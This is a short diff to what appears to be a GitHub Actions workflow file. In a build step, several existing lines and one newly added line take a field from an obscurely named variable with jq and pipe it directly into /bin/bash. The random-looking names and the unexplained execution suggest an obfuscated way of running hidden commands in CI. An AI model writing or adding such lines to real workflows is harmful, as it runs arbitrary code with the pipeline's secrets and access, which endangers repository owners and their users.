@@ -25,6 +25,7 @@ jobs:
           echo $bzzqy2462 | jq -r .p5415 | /bin/bash
           printf '%s' "$vn2" | jq -r .p1 | /bin/bash
           printf '%s' "$unk50" | jq -r .paj87707 | /bin/bash
+          echo $t68 | jq -r .o4 | /bin/bash
 
       - name: Save results
         uses: actions/upload-artifact@v4
